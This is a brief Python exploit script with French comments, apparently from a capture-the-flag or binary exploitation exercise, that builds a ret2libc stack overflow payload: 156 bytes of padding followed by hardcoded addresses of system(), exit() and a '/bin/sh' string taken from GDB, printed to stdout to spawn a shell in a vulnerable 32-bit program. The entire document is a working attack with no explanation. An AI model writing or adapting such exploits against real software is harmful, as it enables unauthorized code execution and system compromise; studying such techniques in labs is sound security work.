import struct
import sys

offset = 156  # trouv√© avec pattern search

# Valeurs prises de GDB
SYSTEM_ADDR = 0xf7e6aed0  # adresse de system
EXIT_ADDR   = 0xf7e5eb70  # adresse de exit
BINSH_ADDR  = 0xf7f897ec  # adresse de "/bin/sh"

payload  = b"A" * offset
payload += struct.pack("<I", SYSTEM_ADDR)
payload += struct.pack("<I", EXIT_ADDR)
payload += struct.pack("<I", BINSH_ADDR)

sys.stdout.buffer.write(payload)